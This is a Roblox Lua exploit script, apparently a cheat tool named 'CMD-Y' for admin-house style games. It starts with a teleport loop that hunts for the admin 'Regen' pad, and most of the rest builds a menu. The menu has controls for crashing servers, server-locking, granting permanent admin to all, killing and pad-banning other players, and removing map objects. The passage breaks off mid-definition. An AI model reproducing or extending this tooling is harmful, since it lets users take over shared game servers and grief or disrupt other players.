			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-500000, 300000, 500000));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-7, 12009, 95));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(734399, 560502, 2776));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-360263, 421796, 716100));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(999982, 3143, 999997));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(696973, 999997, -1000001));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(100000, 10000, 100000));wait(.15)
			wait(.15)
			tchat(_G.prefix.."house")
			tchat(_G.prefix.."house")
			error("Still looking for regen...")
			wait(.3)
			repeat 
				wait()
				root.CFrame = CFrame.new(-7.165, root.Position.Y+2000 , 94.743)
			until workspace.Terrain._Game.Admin:FindFirstChild("Regen")
			root.CFrame = workspace.Terrain._Game.Admin:FindFirstChild("Regen").CFrame + Vector3.new(0,3,0)
		end)




end

function mod:LoadCMDY()
	if game.Players.LocalPlayer.PlayerGui:FindFirstChild("CMD-Y") then
		return
	end

	if not game:IsLoaded() then
		game.Loaded:Wait()
	end

	local CMDY = {
		CodeForCMD = Instance.new("StringValue"),
		NameOfCMD = Instance.new("StringValue"),
		EditableCommand = Instance.new("TextLabel"),
		EDITCMD = Instance.new("TextButton"),
		UICornerEDIT = Instance.new("UICorner"),
		CMDY = Instance.new("ScreenGui"),
		Container = Instance.new("Frame"),
		loadingtext = Instance.new("TextLabel"),
		TabsContainer = Instance.new("Frame"),
		UICorner = Instance.new("UICorner"),
		HomeB = Instance.new("ImageButton"),
		UICorner_2 = Instance.new("UICorner"),
		PlayersB = Instance.new("ImageButton"),
		UICorner_3 = Instance.new("UICorner"),
		GearsB = Instance.new("ImageButton"),
		UICorner_4 = Instance.new("UICorner"),
		TeleportsB = Instance.new("ImageButton"),
		UICorner_5 = Instance.new("UICorner"),
		ObjectsB = Instance.new("ImageButton"),
		UICorner_6 = Instance.new("UICorner"),
		MiscB = Instance.new("ImageButton"),
		EditCommand = Instance.new("Frame"),
		_46j5k456j45i77 = Instance.new("UICorner"),
		closebbb2 = Instance.new("TextButton"),
		_23g2ggu = Instance.new("UICorner"),
		EditBox = Instance.new("TextBox"),
		CUSTOMEdit = Instance.new("TextLabel"),
		Update = Instance.new("TextButton"),
		_2y2tyuis = Instance.new("UICorner"),
		UICorner_7 = Instance.new("UICorner"),
		CommandsB = Instance.new("ImageButton"),
		UICorner_8 = Instance.new("UICorner"),
		HomeP = Instance.new("Frame"),
		frfrfrfrfrf = Instance.new("UICorner"),
		GenLabel = Instance.new("TextLabel"),
		AntiAbuseLabel = Instance.new("TextLabel"),
		AntiAttachLabel = Instance.new("TextLabel"),
		f33452555f = Instance.new("UICorner"),
		AntiAttach = Instance.new("Frame"),
		frfrfrfrfrfbb = Instance.new("UICorner"),
		Toggle_8 = Instance.new("TextButton"),
		frfrfrfrfrfbbs = Instance.new("UICorner"),
		frfrfrfrfrf_2 = Instance.new("UICorner"),
		AntideathLabel = Instance.new("TextLabel"),
		frfrfrfrfrf_3 = Instance.new("UICorner"),
		LoopgrabLabel = Instance.new("TextLabel"),
		frfrfrfrfrf_4 = Instance.new("UICorner"),
		PermAdminAllLabel = Instance.new("TextLabel"),
		frfrfrfrfrf_5 = Instance.new("UICorner"),
		ServerProtectionLabel = Instance.new("TextLabel"),
		frfrfrfrfrf_6 = Instance.new("UICorner"),
		ServerlockLabel = Instance.new("TextLabel"),
		frfrfrfrfrf_7 = Instance.new("UICorner"),
		frfrfrfrfrf_8 = Instance.new("UICorner"),
		Serverlock2 = Instance.new("Frame"),
		frfrfrfrfrf_9 = Instance.new("UICorner"),
		Toggle = Instance.new("TextButton"),
		frfrfrfrfrf_10 = Instance.new("UICorner"),
		frfrfrfrfrf_11 = Instance.new("UICorner"),
		Toggle_2 = Instance.new("TextButton"),
		frfrfrfrfrf_12 = Instance.new("UICorner"),
		Antiabuse1 = Instance.new("Frame"),
		frfrfrfrfrf_13 = Instance.new("UICorner"),
		Toggle_3 = Instance.new("TextButton"),
		frfrfrfrfrf_14 = Instance.new("UICorner"),
		ProteccServer = Instance.new("Frame"),
		frfrfrfrfrf_15 = Instance.new("UICorner"),
		Toggle_4 = Instance.new("TextButton"),
		frfrfrfrfrf_16 = Instance.new("UICorner"),
		Antikill2 = Instance.new("Frame"),
		frfrfrfrfrf_17 = Instance.new("UICorner"),
		Toggle_5 = Instance.new("TextButton"),
		frfrfrfrfrf_18 = Instance.new("UICorner"),
		Perm2 = Instance.new("Frame"),
		frfrfrfrfrf_19 = Instance.new("UICorner"),
		Toggle_6 = Instance.new("TextButton"),
		frfrfrfrfrf_20 = Instance.new("UICorner"),
		Loopgrabi = Instance.new("Frame"),
		AddCommand = Instance.new("TextButton"),
		UICorner23232323 = Instance.new("UICorner"),
		frfrfrfrfrf_21 = Instance.new("UICorner"),
		Toggle_7 = Instance.new("TextButton"),
		frfrfrfrfrf_22 = Instance.new("UICorner"),
		ObjectsP = Instance.new("Frame"),
		frfrfrfrfrf_23 = Instance.new("UICorner"),
		ObjectsLabel = Instance.new("TextLabel"),
		FindRegen = Instance.new("TextButton"),
		AddCommandMenu = Instance.new("Frame"),
		_46j5k456j45i = Instance.new("UICorner"),
		closebbb = Instance.new("TextButton"),
		_23g2gg = Instance.new("UICorner"),
		CMDBOX = Instance.new("TextBox"),
		CUSTOMLAB = Instance.new("TextLabel"),
		Add = Instance.new("TextButton"),
		_2y2tyui = Instance.new("UICorner"),
		NAMELAB = Instance.new("TextLabel"),
		NameToDo = Instance.new("TextBox"),
		sdfsdfsdf3423 = Instance.new("UICorner"),
		_2y2tyui_2 = Instance.new("UICorner"),
		TopBar = Instance.new("Frame"),
		frfrfrfrfrf_24 = Instance.new("UICorner"),
		FindPads = Instance.new("TextButton"),
		frfrfrfrfrf_25 = Instance.new("UICorner"),
		RemovePads = Instance.new("TextButton"),
		frfrfrfrfrf_26 = Instance.new("UICorner"),
		RemoveRegen = Instance.new("TextButton"),
		frfrfrfrfrf_27 = Instance.new("UICorner"),
		RemoveObby = Instance.new("TextButton"),
		frfrfrfrfrf_28 = Instance.new("UICorner"),
		RemoveBaseplate = Instance.new("TextButton"),
		frfrfrfrfrf_29 = Instance.new("UICorner"),
		BringRegen = Instance.new("TextButton"),
		frfrfrfrfrf_30 = Instance.new("UICorner"),
		BringPads = Instance.new("TextButton"),
		frfrfrfrfrf_31 = Instance.new("UICorner"),
		BringObby = Instance.new("TextButton"),
		frfrfrfrfrf_32 = Instance.new("UICorner"),
		BringBaseplate = Instance.new("TextButton"),
		frfrfrfrfrf_33 = Instance.new("UICorner"),
		TeleportsP = Instance.new("Frame"),
		frfrfrfrfrf_34 = Instance.new("UICorner"),
		TeleportsLabel = Instance.new("TextLabel"),
		House = Instance.new("TextButton"),
		frfrfrfrfrf_35 = Instance.new("UICorner"),
		AdminPads = Instance.new("TextButton"),
		frfrfrfrfrf_36 = Instance.new("UICorner"),
		RegenPad = Instance.new("TextButton"),
		frfrfrfrfrf_37 = Instance.new("UICorner"),
		Spawn = Instance.new("TextButton"),
		frfrfrfrfrf_38 = Instance.new("UICorner"),
		SpawnBind = Instance.new("TextBox"),
		UICorner_9 = Instance.new("UICorner"),
		HouseBind = Instance.new("TextBox"),
		UICorner_10 = Instance.new("UICorner"),
		TextLabel = Instance.new("TextLabel"),
		TextLabel_2 = Instance.new("TextLabel"),
		TextLabel_3 = Instance.new("TextLabel"),
		TextLabel_4 = Instance.new("TextLabel"),
		AdminPadsBind = Instance.new("TextBox"),
		UICorner_11 = Instance.new("UICorner"),
		RegenPadBind = Instance.new("TextBox"),
		UICorner_12 = Instance.new("UICorner"),
		MiscP = Instance.new("Frame"),
		frfrfrfrfrf_39 = Instance.new("UICorner"),
		MiscLabel = Instance.new("TextLabel"),
		Crash = Instance.new("TextButton"),
		frfrfrfrfrf_40 = Instance.new("UICorner"),
		ForceRespawn = Instance.new("TextButton"),
		frfrfrfrfrf_41 = Instance.new("UICorner"),
		ClickToAttach = Instance.new("TextButton"),
		frfrfrfrfrf_42 = Instance.new("UICorner"),
		SilentLogs = Instance.new("TextButton"),
		frfrfrfrfrf_43 = Instance.new("UICorner"),
		FixColors = Instance.new("TextButton"),
		frfrfrfrfrf_44 = Instance.new("UICorner"),
		BtoolsV2Button = Instance.new("TextButton"),
		frfrfrfrfrf_45 = Instance.new("UICorner"),
		ColorMap = Instance.new("TextButton"),
		frfrfrfrfrf_46 = Instance.new("UICorner"),
		ColorFrame = Instance.new("Frame"),
		placeholder4 = Instance.new("TextButton"),
		frfrfrfrfrf_47 = Instance.new("UICorner"),
		SilCrash = Instance.new("TextButton"),
		frfrfrfrfrf_48 = Instance.new("UICorner"),
		GearsP = Instance.new("Frame"),
		frfrfrfrfrf_49 = Instance.new("UICorner"),
		Gears = Instance.new("TextLabel"),
		Guns = Instance.new("TextButton"),
		frfrfrfrfrf_50 = Instance.new("UICorner"),
		Swords = Instance.new("TextButton"),
		frfrfrfrfrf_51 = Instance.new("UICorner"),
		FunGears = Instance.new("TextButton"),
		frfrfrfrfrf_52 = Instance.new("UICorner"),
		ClientBtools = Instance.new("TextButton"),
		frfrfrfrfrf_53 = Instance.new("UICorner"),
		SSBtools = Instance.new("TextButton"),
		frfrfrfrfrf_54 = Instance.new("UICorner"),
		Destructive = Instance.new("TextButton"),
		frfrfrfrfrf_55 = Instance.new("UICorner"),
		Explosives = Instance.new("TextButton"),
		frfrfrfrfrf_56 = Instance.new("UICorner"),
		Melees = Instance.new("TextButton"),
		frfrfrfrfrf_57 = Instance.new("UICorner"),
		Rideables = Instance.new("TextButton"),
		frfrfrfrfrf_58 = Instance.new("UICorner"),
		PlayersP = Instance.new("Frame"),
		frfrfrfrfrf_59 = Instance.new("UICorner"),
		PlrList = Instance.new("Frame"),
		UIGridLayout = Instance.new("UIGridLayout"),
		PlayersLabel = Instance.new("TextLabel"),
		CommandsP = Instance.new("Frame"),
		frfrfrfrfrf_60 = Instance.new("UICorner"),
		Commands = Instance.new("TextLabel"),
		ScrollingFrame = Instance.new("ScrollingFrame"),
		UIListLayout = Instance.new("UIListLayout"),
		Command = Instance.new("TextLabel"),
		UICorner_13 = Instance.new("UICorner"),
		SettingsP = Instance.new("Frame"),
		frfrfrfrfrf_61 = Instance.new("UICorner"),
		Settings = Instance.new("TextLabel"),
		TextLabel_5 = Instance.new("TextLabel"),
		TextLabel_6 = Instance.new("TextLabel"),
		TextLabel_7 = Instance.new("TextLabel"),
		TextLabel_8 = Instance.new("TextLabel"),
		TextLabel_9 = Instance.new("TextLabel"),
		TextLabel_10 = Instance.new("TextLabel"),
		Prefix = Instance.new("TextBox"),
		UICorner_14 = Instance.new("UICorner"),
		BarHotKey = Instance.new("TextBox"),
		UICorner_15 = Instance.new("UICorner"),
		GuiTheme = Instance.new("TextButton"),
		Drop = Instance.new("TextButton"),
		UICorner_16 = Instance.new("UICorner"),
		PlayerMenu = Instance.new("Frame"),
		UICorner_17 = Instance.new("UICorner"),
		Player = Instance.new("ImageLabel"),
		UICorner_18 = Instance.new("UICorner"),
		Whitelist = Instance.new("TextButton"),
		UICorner_19 = Instance.new("UICorner"),
		Blacklist = Instance.new("TextButton"),
		UICorner_20 = Instance.new("UICorner"),
		Padban = Instance.new("TextButton"),
		UICorner_21 = Instance.new("UICorner"),
		Unperm = Instance.new("TextButton"),
		UICorner_22 = Instance.new("UICorner"),
		Teleport = Instance.new("TextButton"),
		UICorner_23 = Instance.new("UICorner"),
		Kill = Instance.new("TextButton"),
		UICorner_24 = Instance.new("UICorner"),
		GoTo = Instance.new("TextButton"),
		UICorner_25 = Instance.new("UICorner"),
		close = Instance.new("TextButton"),
		UICorner_26 = Instance.new("UICorner"),
		ThemeColorPickerMenu = Instance.new("Frame"),
		UICorner_27 = Instance.new("UICorner"),
		Preview = Instance.new("Frame"),
		Gradient = Instance.new("TextButton"),
		Slider = Instance.new("TextButton"),
		UICorner_28 = Instance.new("UICorner"),
		UIGradient = Instance.new("UIGradient"),
		close_2 = Instance.new("TextButton"),
		UICorner_29 = Instance.new("UICorner"),
		MapColorPicker = Instance.new("Frame"),
		UICorner_30 = Instance.new("UICorner"),
		Preview_2 = Instance.new("Frame"),
		Gradient_2 = Instance.new("TextButton"),
		Slider_2 = Instance.new("TextButton"),
		UICorner_31 = Instance.new("UICorner"),
		UIGradient_2 = Instance.new("UIGradient"),
		close_3 = Instance.new("TextButton"),
		UICorner_32 = Instance.new("UICorner"),
		UICorner_33 = Instance.new("UICorner"),
		Player_2 = Instance.new("ImageLabel"),
		UICorner_34 = Instance.new("UICorner"),
		Dropdown = Instance.new("TextButton"),
		UICorner_35 = Instance.new("UICorner"),
		Label = Instance.new("TextLabel"),
		UICorner_36 = Instance.new("UICorner"),
		CloseOpen = Instance.new("TextButton"),
		UICorner_37 = Instance.new("UICorner"),
		Settings_2 = Instance.new("ImageButton"),
		Rejoin = Instance.new("ImageButton"),
		Serverhop = Instance.new("ImageButton"),
		Label_2 = Instance.new("TextLabel"),
		CMDBar = Instance.new("TextBox"),
		SilentLogsBar = Instance.new("Frame"),
		s52552252525 = Instance.new("UICorner"),
		UiCornerTghing = Instance.new("Frame"),
		SilentLogsFrame = Instance.new("Frame"),
		SilentLogsScrollingFrame = Instance.new("ScrollingFrame"),
		ChatLog = Instance.new("TextLabel"),
		UIListLayout69 = Instance.new("UIListLayout"),
		CloseLogs = Instance.new("TextButton"),
		s66226262626 = Instance.new("UICorner")
	}

	--Properties:

	CMDY.CMDY.Name = "CMD-Y"
	CMDY.CMDY.Parent = game.Players.LocalPlayer.PlayerGui
	CMDY.CMDY.ResetOnSpawn = false
	CMDY.CMDY.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	CMDY.Container.Name = "Container"
	CMDY.Container.Parent = CMDY.CMDY
	CMDY.Container.AnchorPoint = Vector2.new(0.5, 0.5)
	CMDY.Container.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
	CMDY.Container.BorderColor3 = Color3.fromRGB(58, 54, 53)
	CMDY.Container.BorderSizePixel = 0
	CMDY.Container.ClipsDescendants = true
	CMDY.Container.Position = UDim2.new(0.5, 0, 0.5, 0)
	CMDY.Container.Size = UDim2.new(0, 312, 0, 186)

	CMDY.loadingtext.Name = "loadingtext"
	CMDY.loadingtext.Parent = CMDY.Container
	CMDY.loadingtext.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.loadingtext.BackgroundTransparency = 1.000
	CMDY.loadingtext.Position = UDim2.new(0.11261481, 0, 0.430963039, 0)
	CMDY.loadingtext.Size = UDim2.new(0, 243, 0, 35)
	CMDY.loadingtext.Font = Enum.Font.JosefinSans
	CMDY.loadingtext.Text = ""
	CMDY.loadingtext.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.loadingtext.TextSize = 14.000
	CMDY.loadingtext.TextTransparency = 1.000
	CMDY.loadingtext.TextWrapped = true

	CMDY.TabsContainer.Name = "TabsContainer"
	CMDY.TabsContainer.Parent = CMDY.Container
	CMDY.TabsContainer.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
	CMDY.TabsContainer.BackgroundTransparency = 1.000
	CMDY.TabsContainer.Position = UDim2.new(0, 0, 0.0473372787, 0)
	CMDY.TabsContainer.Size = UDim2.new(0, 61, 0, 322)

	CMDY.UICorner.Parent = CMDY.TabsContainer

	CMDY.HomeB.Name = "HomeB"
	CMDY.HomeB.Parent = CMDY.TabsContainer
	CMDY.HomeB.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	CMDY.HomeB.BackgroundTransparency = 1.000
	CMDY.HomeB.Position = UDim2.new(0.20157975, 0, 0.0635488778, 0)
	CMDY.HomeB.Size = UDim2.new(0, 38, 0, 36)
	CMDY.HomeB.Image = "rbxassetid://11891748134"
	CMDY.HomeB.ImageTransparency = 1.000

	CMDY.UICorner_2.Parent = CMDY.HomeB

	CMDY.PlayersB.Name = "PlayersB"
	CMDY.PlayersB.Parent = CMDY.TabsContainer
	CMDY.PlayersB.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	CMDY.PlayersB.BackgroundTransparency = 1.000
	CMDY.PlayersB.Position = UDim2.new(0.20157975, 0, 0.197089255, 0)
	CMDY.PlayersB.Size = UDim2.new(0, 38, 0, 36)
	CMDY.PlayersB.Image = "rbxassetid://11891727922"
	CMDY.PlayersB.ImageTransparency = 1.000

	CMDY.UICorner_3.Parent = CMDY.PlayersB

	CMDY.GearsB.Name = "GearsB"
	CMDY.GearsB.Parent = CMDY.TabsContainer
	CMDY.GearsB.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	CMDY.GearsB.BackgroundTransparency = 1.000
	CMDY.GearsB.Position = UDim2.new(0.20157975, 0, 0.330629617, 0)
	CMDY.GearsB.Size = UDim2.new(0, 38, 0, 36)
	CMDY.GearsB.Image = "rbxassetid://11891694638"
	CMDY.GearsB.ImageTransparency = 1.000

	CMDY.UICorner_4.Parent = CMDY.GearsB

	CMDY.TeleportsB.Name = "TeleportsB"
	CMDY.TeleportsB.Parent = CMDY.TabsContainer
	CMDY.TeleportsB.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	CMDY.TeleportsB.BackgroundTransparency = 1.000
	CMDY.TeleportsB.Position = UDim2.new(0.20157975, 0, 0.461064398, 0)
	CMDY.TeleportsB.Size = UDim2.new(0, 38, 0, 36)
	CMDY.TeleportsB.Image = "rbxassetid://3192485344"
	CMDY.TeleportsB.ImageTransparency = 1.000

	CMDY.UICorner_5.Parent = CMDY.TeleportsB

	CMDY.ObjectsB.Name = "ObjectsB"
	CMDY.ObjectsB.Parent = CMDY.TabsContainer
	CMDY.ObjectsB.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	CMDY.ObjectsB.BackgroundTransparency = 1.000
	CMDY.ObjectsB.Position = UDim2.new(0.20157975, 0, 0.59460485, 0)
	CMDY.ObjectsB.Size = UDim2.new(0, 38, 0, 36)
	CMDY.ObjectsB.Image = "rbxassetid://5430510661"
	CMDY.ObjectsB.ImageTransparency = 1.000

	CMDY.UICorner_6.Parent = CMDY.ObjectsB

	CMDY.MiscB.Name = "MiscB"
	CMDY.MiscB.Parent = CMDY.TabsContainer
	CMDY.MiscB.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	CMDY.MiscB.BackgroundTransparency = 1.000
	CMDY.MiscB.Position = UDim2.new(0.20157975, 0, 0.731250763, 0)
	CMDY.MiscB.Size = UDim2.new(0, 38, 0, 36)
	CMDY.MiscB.Image = "rbxassetid://11891682476"
	CMDY.MiscB.ImageTransparency = 1.000

	CMDY.UICorner_7.Parent = CMDY.MiscB

	CMDY.CommandsB.Name = "CommandsB"
	CMDY.CommandsB.Parent = CMDY.TabsContainer
	CMDY.CommandsB.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	CMDY.CommandsB.BackgroundTransparency = 1.000
	CMDY.CommandsB.Position = UDim2.new(0.20157975, 0, 0.864791214, 0)
	CMDY.CommandsB.Size = UDim2.new(0, 38, 0, 36)
	CMDY.CommandsB.Image = "rbxassetid://5107183916"
	CMDY.CommandsB.ImageTransparency = 1.000

	CMDY.UICorner_8.Parent = CMDY.CommandsB

	CMDY.HomeP.Name = "HomeP"
	CMDY.HomeP.Parent = CMDY.TabsContainer
	CMDY.HomeP.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	CMDY.HomeP.Position = UDim2.new(1.0830158, 0, 0.0613396689, 0)
	CMDY.HomeP.Size = UDim2.new(0, 332, 0, 294)
	CMDY.HomeP.SizeConstraint = Enum.SizeConstraint.RelativeYY
	CMDY.HomeP.Visible = false

	CMDY.frfrfrfrfrf.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf.Parent = CMDY.HomeP

	CMDY.GenLabel.Name = "GenLabel"
	CMDY.GenLabel.Parent = CMDY.HomeP
	CMDY.GenLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.GenLabel.BackgroundTransparency = 1.000
	CMDY.GenLabel.Position = UDim2.new(0.315184563, 0, 0.000427559018, 0)
	CMDY.GenLabel.Size = UDim2.new(0, 123, 0, 18)
	CMDY.GenLabel.Font = Enum.Font.JosefinSans
	CMDY.GenLabel.Text = "General"
	CMDY.GenLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.GenLabel.TextScaled = true
	CMDY.GenLabel.TextSize = 14.000
	CMDY.GenLabel.TextWrapped = true

	CMDY.AntiAbuseLabel.Name = "AntiAbuseLabel"
	CMDY.AntiAbuseLabel.Parent = CMDY.HomeP
	CMDY.AntiAbuseLabel.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.AntiAbuseLabel.Position = UDim2.new(0.0209999997, 0, 0.618000031, 0)
	CMDY.AntiAbuseLabel.Size = UDim2.new(0, 318, 0, 31)
	CMDY.AntiAbuseLabel.Font = Enum.Font.JosefinSans
	CMDY.AntiAbuseLabel.Text = "    AntiAbuse"
	CMDY.AntiAbuseLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.AntiAbuseLabel.TextSize = 14.000
	CMDY.AntiAbuseLabel.TextWrapped = true
	CMDY.AntiAbuseLabel.TextXAlignment = Enum.TextXAlignment.Left

	CMDY.frfrfrfrfrf_2.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_2.Parent = CMDY.AntiAbuseLabel

	CMDY.AntideathLabel.Name = "AntideathLabel"
	CMDY.AntideathLabel.Parent = CMDY.HomeP
	CMDY.AntideathLabel.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.AntideathLabel.Position = UDim2.new(0.0209999997, 0, 0.486757547, 0)
	CMDY.AntideathLabel.Size = UDim2.new(0, 318, 0, 31)
	CMDY.AntideathLabel.Font = Enum.Font.JosefinSans
	CMDY.AntideathLabel.Text = "    AntiDeath"
	CMDY.AntideathLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.AntideathLabel.TextSize = 14.000
	CMDY.AntideathLabel.TextWrapped = true
	CMDY.AntideathLabel.TextXAlignment = Enum.TextXAlignment.Left

	CMDY.frfrfrfrfrf_3.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_3.Parent = CMDY.AntideathLabel

	CMDY.LoopgrabLabel.Name = "LoopgrabLabel"
	CMDY.LoopgrabLabel.Parent = CMDY.HomeP
	CMDY.LoopgrabLabel.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.LoopgrabLabel.Position = UDim2.new(0.0209999997, 0, 0.226787895, 0)
	CMDY.LoopgrabLabel.Size = UDim2.new(0, 318, 0, 31)
	CMDY.LoopgrabLabel.Font = Enum.Font.JosefinSans
	CMDY.LoopgrabLabel.Text = "    Loopgrab Pads"
	CMDY.LoopgrabLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.LoopgrabLabel.TextSize = 14.000
	CMDY.LoopgrabLabel.TextWrapped = true
	CMDY.LoopgrabLabel.TextXAlignment = Enum.TextXAlignment.Left

	CMDY.frfrfrfrfrf_4.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_4.Parent = CMDY.LoopgrabLabel

	CMDY.PermAdminAllLabel.Name = "PermAdminAllLabel"
	CMDY.PermAdminAllLabel.Parent = CMDY.HomeP
	CMDY.PermAdminAllLabel.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.PermAdminAllLabel.Position = UDim2.new(0.0209999997, 0, 0.8720476855, 0)
	CMDY.PermAdminAllLabel.Size = UDim2.new(0, 318, 0, 31)
	CMDY.PermAdminAllLabel.Font = Enum.Font.JosefinSans
	CMDY.PermAdminAllLabel.Text = "    Perm Admin All"
	CMDY.PermAdminAllLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.PermAdminAllLabel.TextSize = 14.000
	CMDY.PermAdminAllLabel.TextWrapped = true
	CMDY.PermAdminAllLabel.TextXAlignment = Enum.TextXAlignment.Left

	CMDY.frfrfrfrfrf_5.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_5.Parent = CMDY.PermAdminAllLabel

	CMDY.ServerProtectionLabel.Name = "ServerProtectionLabel"
	CMDY.ServerProtectionLabel.Parent = CMDY.HomeP
	CMDY.ServerProtectionLabel.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.ServerProtectionLabel.Position = UDim2.new(0.0209999997, 0, 0.743393958, 0)
	CMDY.ServerProtectionLabel.Size = UDim2.new(0, 318, 0, 31)
	CMDY.ServerProtectionLabel.Font = Enum.Font.JosefinSans
	CMDY.ServerProtectionLabel.Text = "    Protect Server"
	CMDY.ServerProtectionLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.ServerProtectionLabel.TextSize = 14.000
	CMDY.ServerProtectionLabel.TextWrapped = true
	CMDY.ServerProtectionLabel.TextXAlignment = Enum.TextXAlignment.Left

	CMDY.frfrfrfrfrf_6.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_6.Parent = CMDY.ServerProtectionLabel

	CMDY.ServerlockLabel.Name = "ServerlockLabel"
	CMDY.ServerlockLabel.Parent = CMDY.HomeP
	CMDY.ServerlockLabel.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.ServerlockLabel.Position = UDim2.new(0.0209999997, 0, 0.0981341675, 0)
	CMDY.ServerlockLabel.Size = UDim2.new(0, 318, 0, 31)
	CMDY.ServerlockLabel.Font = Enum.Font.JosefinSans
	CMDY.ServerlockLabel.Text = "    Serverlock"
	CMDY.ServerlockLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.ServerlockLabel.TextSize = 14.000
	CMDY.ServerlockLabel.TextWrapped = true
	CMDY.ServerlockLabel.TextXAlignment = Enum.TextXAlignment.Left

	CMDY.frfrfrfrfrf_7.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_7.Parent = CMDY.ServerlockLabel

	CMDY.Serverlock2.Name = "Serverlock2"
	CMDY.Serverlock2.Parent = CMDY.HomeP
	CMDY.Serverlock2.BackgroundColor3 = Color3.fromRGB(131, 131, 131)
	CMDY.Serverlock2.Position = UDim2.new(0.839357436, 0, 0.124731168, 0)
	CMDY.Serverlock2.Size = UDim2.new(0, 33, 0, 15)

	CMDY.frfrfrfrfrf_9.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_9.Parent = CMDY.Serverlock2

	CMDY.Toggle.Name = "Toggle"
	CMDY.Toggle.Parent = CMDY.Serverlock2
	CMDY.Toggle.BackgroundColor3 = Color3.fromRGB(255, 105, 105)
	CMDY.Toggle.Position = UDim2.new(-0.0222630501, 0, 0.0013936758, 0)
	CMDY.Toggle.Size = UDim2.new(0, 15, 0, 15)
	CMDY.Toggle.Font = Enum.Font.SourceSans
	CMDY.Toggle.Text = ""
	CMDY.Toggle.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.Toggle.TextSize = 14.000

	CMDY.frfrfrfrfrf_10.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_10.Parent = CMDY.Toggle

	CMDY.Antiabuse1.Name = "Antiabuse1"
	CMDY.Antiabuse1.Parent = CMDY.HomeP
	CMDY.Antiabuse1.BackgroundColor3 = Color3.fromRGB(131, 131, 131)
	CMDY.Antiabuse1.Position = UDim2.new(0.839357436, 0, 0.641397834, 0)
	CMDY.Antiabuse1.Size = UDim2.new(0, 33, 0, 15)

	CMDY.frfrfrfrfrf_13.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_13.Parent = CMDY.Antiabuse1

	CMDY.Toggle_3.Name = "Toggle"
	CMDY.Toggle_3.Parent = CMDY.Antiabuse1
	CMDY.Toggle_3.BackgroundColor3 = Color3.fromRGB(255, 105, 105)
	CMDY.Toggle_3.Position = UDim2.new(-0.0222630501, 0, 0.0013936758, 0)
	CMDY.Toggle_3.Size = UDim2.new(0, 15, 0, 15)
	CMDY.Toggle_3.Font = Enum.Font.SourceSans
	CMDY.Toggle_3.Text = ""
	CMDY.Toggle_3.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.Toggle_3.TextSize = 14.000

	CMDY.frfrfrfrfrf_14.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_14.Parent = CMDY.Toggle_3

	CMDY.AntiAttachLabel.Name = "AntiAttachLabel"
	CMDY.AntiAttachLabel.Parent = CMDY.HomeP
	CMDY.AntiAttachLabel.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.AntiAttachLabel.Position = UDim2.new(0.0209999997, 0, 0.355666667, 0)
	CMDY.AntiAttachLabel.Size = UDim2.new(0, 318, 0, 31)
	CMDY.AntiAttachLabel.Font = Enum.Font.JosefinSans
	CMDY.AntiAttachLabel.Text = "    AntiAttach"
	CMDY.AntiAttachLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.AntiAttachLabel.TextSize = 14.000
	CMDY.AntiAttachLabel.TextWrapped = true
	CMDY.AntiAttachLabel.TextXAlignment = Enum.TextXAlignment.Left

	CMDY.f33452555f.Name = "f33452555f"
	CMDY.f33452555f.Parent = CMDY.AntiAttachLabel

	CMDY.AntiAttach.Name = "AntiAttach"
	CMDY.AntiAttach.Parent = CMDY.HomeP
	CMDY.AntiAttach.BackgroundColor3 = Color3.fromRGB(131, 131, 131)
